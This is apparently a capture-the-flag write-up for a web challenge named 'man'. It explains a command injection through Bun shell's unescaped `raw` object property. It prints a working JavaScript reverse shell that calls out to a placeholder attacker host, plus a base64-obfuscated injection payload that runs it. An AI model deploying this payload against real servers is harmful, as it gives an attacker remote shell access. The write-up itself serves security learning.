# Man

The web 'man' challenge is based on exploiting Bun's shell integration.
Normally, it will escape the input such that no command injection can occour.
However, if you put the input in a `raw` property in an object, it will not escape it.
This is documented in [Bun's documentation](https://bun.com/docs/runtime/shell#escape-escape-strings).

The API does not validate if the input is a string, or an object.
For this reason you can supply an object with the `raw` key.

The simplest solution might be to create a reverse shell:

```js
(function () {
  const sh = child_process.spawn('sh', []);
  const client = new net.Socket();
  client.connect(1337, 'attacker server or ngrok', function () {
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  return /a/;
})();
```

To avoid issues with encoding, we can URL encode it like such:

```js
eval(atob('[base64 encoded revshell]'));
```

The final payload can look something like this:

```js
{
  program: {
    raw: `$(bun -e 'eval(atob("KGZ1bmN0aW9uICgpIHsNCiAgY29uc3Qgc2ggPSBjaGlsZF9wcm9jZXNzLnNwYXduKCdzaCcsIFtdKTsNCiAgY29uc3QgY2xpZW50ID0gbmV3IG5ldC5Tb2NrZXQoKTsNCiAgY2xpZW50LmNvbm5lY3QoMTMzNywgJ2xvY2FsaG9zdCcsIGZ1bmN0aW9uICgpIHsNCiAgICBjbGllbnQucGlwZShzaC5zdGRpbik7DQogICAgc2guc3Rkb3V0LnBpcGUoY2xpZW50KTsNCiAgICBzaC5zdGRlcnIucGlwZShjbGllbnQpOw0KICB9KTsNCiAgcmV0dXJuIC9hLzsNCn0pKCk7"))')`,
  },
}
```

You may face issues using non-bun revshells, as the container does not have a lot of utilities installed.
